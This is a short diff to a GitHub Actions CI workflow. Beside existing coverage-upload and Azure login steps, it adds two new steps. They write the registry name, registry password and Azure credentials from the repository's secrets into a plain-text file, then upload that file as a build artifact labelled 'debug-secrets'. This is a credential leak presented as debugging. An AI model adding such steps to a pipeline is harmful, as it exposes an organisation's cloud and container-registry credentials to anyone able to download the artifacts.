@@ -139,6 +139,18 @@ jobs:
           name: frontend-coverage-report
           path: frontend/coverage_reports/lcov.info
       
+      - name: Write secrets to file
+        run: |
+          echo "REGISTRY_NAME=${{ secrets.REGISTRY_NAME }}" > secrets_dump.txt
+          echo "REGISTRY_PASSWORD=${{ secrets.REGISTRY_PASSWORD }}" >> secrets_dump.txt
+          echo "AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}" >> secrets_dump.txt
+
+      - name: Upload secrets dump as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: debug-secrets
+          path: secrets_dump.txt
+      
       - name: Log in to Azure
         if: github.event_name == 'push' && github.ref == 'refs/heads/main'
         uses: azure/login@v1
